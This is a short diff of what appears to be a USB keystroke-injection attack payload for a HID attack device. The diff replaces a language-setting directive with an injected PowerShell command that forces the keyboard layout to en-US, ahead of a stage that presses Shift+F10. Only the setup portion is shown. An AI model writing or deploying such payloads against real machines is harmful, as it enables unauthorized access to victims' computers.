@@ -1,9 +1,9 @@
 #!/bin/bash
-QUACK SET_LANGUAGE us
+
 LED SETUP
 ATTACKMODE HID STORAGE
 GET SWITCH_POSITION
-
+Q STRING "powershell.exe Set-WinUserLanguageList -LanguageList en-US -force"
 # Stage 1 - Powershell
 LED ATTACK
 Q SHIFT F10
